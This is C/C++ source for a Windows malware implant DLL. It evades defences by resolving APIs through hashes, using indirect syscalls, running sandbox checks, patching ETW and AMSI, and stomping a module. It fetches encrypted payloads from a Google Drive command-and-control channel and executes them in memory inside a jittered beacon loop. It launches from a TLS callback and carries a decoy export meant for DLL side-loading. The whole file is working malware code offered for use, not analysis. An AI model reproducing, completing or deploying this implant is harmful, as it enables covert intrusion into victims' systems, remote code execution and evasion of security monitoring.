#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"
#include "advanced_bypass.h"
#include "syscalls.h"
#include "god_mode_stealth.h"

// ===============================================================
// Global State
// ===============================================================
PVOID g_SyscallGadget = NULL;
API_TABLE g_ApiTable = {0};
static volatile BOOL g_ShouldTerminate = FALSE;

// ---------------------------------------------------------------
// Helper: Initialize all required components
// ---------------------------------------------------------------
static BOOL InitializeAll() {
    // Resolve syscall gadget
    g_SyscallGadget = FindSyscallGadgetViaHash();
    if (!g_SyscallGadget) return FALSE;

    // Resolve essential modules
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
    if (!hNtdll || !hKernel32) return FALSE;

    // Populate syscall table
    InitializeSyscallTable(&g_ApiTable.syscalls, hNtdll, g_SyscallGadget);
    if (g_ApiTable.syscalls.NtAllocateVirtualMemory.ssn == 0 ||
        g_ApiTable.syscalls.NtProtectVirtualMemory.ssn == 0 ||
        g_ApiTable.syscalls.NtWriteVirtualMemory.ssn == 0) {
        return FALSE;
    }

    // Resolve Kernel32 helpers
    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer      = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);

    // Resolve Advapi32 for SystemFunction032 if needed
    PVOID hAdvapi32 = GetModuleBaseByHash(HASH_ADVAPI32);
    if (!hAdvapi32) {
        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
        LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
        if (pLoadLibraryW) hAdvapi32 = pLoadLibraryW(OBFUSCATE(L"advapi32.dll"));
    }
    if (hAdvapi32) {
        g_ApiTable.SystemFunction032 = (ULONG_PTR)ResolveApiByHash(hAdvapi32, HASH_SystemFunction032);
    }

    // Keep a clean reference to ntdll (optional for future checks)
    g_ApiTable.CleanNtdllBase = hNtdll;
    return TRUE;
}

// ---------------------------------------------------------------
// Execute a payload with AEAD integrity verification
// ---------------------------------------------------------------
static BOOL ExecutePayload(PVOID pTargetAddr, SIZE_T targetSize) {
    // Allocate a buffer sized to the target region (dynamic)
    uint8_t *payloadBuf = (uint8_t*)VirtualAlloc(NULL, targetSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!payloadBuf) return FALSE;

    DWORD bytesReceived = 0;
    if (!GDrive_CheckForCommandsEx((char*)payloadBuf, (DWORD)targetSize, &bytesReceived)) {
        VirtualFree(payloadBuf, 0, MEM_RELEASE);
        return FALSE;
    }
    if (bytesReceived == 0 || bytesReceived > targetSize) {
        VirtualFree(payloadBuf, 0, MEM_RELEASE);
        return FALSE;
    }

    // Expected layout: [nonce][tag][ciphertext]
    if (bytesReceived < CHACHA_NONCE_SIZE + POLY1305_TAG_SIZE + 1) {
        VirtualFree(payloadBuf, 0, MEM_RELEASE);
        return FALSE;
    }
    uint8_t *nonce = payloadBuf;
    uint8_t *tag   = payloadBuf + CHACHA_NONCE_SIZE;
    uint8_t *ciphertext = payloadBuf + CHACHA_NONCE_SIZE + POLY1305_TAG_SIZE;
    DWORD ctLen = bytesReceived - CHACHA_NONCE_SIZE - POLY1305_TAG_SIZE;

    // Derive key from HWID and decrypt
    uint8_t hk[CHACHA_KEY_SIZE];
    DeriveKeyFromHWID(hk);
    BOOL ok = AeadDecrypt(hk, nonce, NULL, 0, ciphertext, ctLen, tag);
    SecureWipe(hk, sizeof(hk));
    if (!ok) {
        VirtualFree(payloadBuf, 0, MEM_RELEASE);
        return FALSE;
    }

    // Write decrypted payload into the target memory region
    SIZE_T written = 0;
    InvokeSyscall(g_ApiTable.syscalls.NtWriteVirtualMemory.ssn,
        g_SyscallGadget, (HANDLE)-1, pTargetAddr, ciphertext, ctLen, &written);
    if (written != ctLen) {
        VirtualFree(payloadBuf, 0, MEM_RELEASE);
        return FALSE;
    }

    // Change protection to executable
    PVOID addr = pTargetAddr;
    SIZE_T sz = targetSize;
    ULONG oldProtect;
    InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn,
        g_SyscallGadget, (HANDLE)-1, &addr, &sz, PAGE_EXECUTE_READ, &oldProtect);

    // Execute via thread‑less technique
    ThreadlessExecute(pTargetAddr);

    VirtualFree(payloadBuf, 0, MEM_RELEASE);
    return TRUE;
}

// ---------------------------------------------------------------
// Main runner – orchestrates initialization, evasion, and beaconing
// ---------------------------------------------------------------
static void Run() {
    if (!InitializeAll()) return;
    if (!EnvironmentSafe()) { g_ShouldTerminate = TRUE; return; }

    // Evasion steps
    BypassETW();
    BypassAMSI_DataOnly();

    // Stomp a legitimate module (dynamic choice)
    STOMP_CONTEXT ctx = {0};
    if (!ModuleStompAdvanced(OBFUSCATE(L"mshtml.dll"), 0x10000, &ctx)) {
        if (!ModuleStompAdvanced(OBFUSCATE(L"dxgi.dll"), 0x10000, &ctx)) {
            g_ShouldTerminate = TRUE; return;
        }
    }
    PVOID pTarget = (PBYTE)ctx.BaseAddress + ctx.TextSection->VirtualAddress;

    // Initial payload execution
    ExecutePayload(pTarget, ctx.RegionSize);

    // Beacon loop – configurable interval (default 60s) with jitter
    const DWORD baseInterval = 60000; // 1 minute
    while (!g_ShouldTerminate) {
        if (!EnvironmentSafe()) { g_ShouldTerminate = TRUE; break; }
        AdvancedSleepMask(baseInterval, pTarget, ctx.RegionSize);
        ExecutePayload(pTarget, ctx.RegionSize);
    }
}

// ---------------------------------------------------------------
// TLS Callback – safe entry point before DllMain
// ---------------------------------------------------------------
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback")

void NTAPI TlsCallback(PVOID hModule, DWORD dwReason, PVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Run, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}

extern "C" const PIMAGE_TLS_CALLBACK _tls_callback = TlsCallback;

// ---------------------------------------------------------------
// Exported stub – innocuous name for side‑loading scenarios
// ---------------------------------------------------------------
extern "C" __declspec(dllexport) void DllRegisterServer() {
    // No operation – real work happens in TLS callback
}

// Minimal DllMain – disables further thread notifications
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
    }
    return TRUE;
}
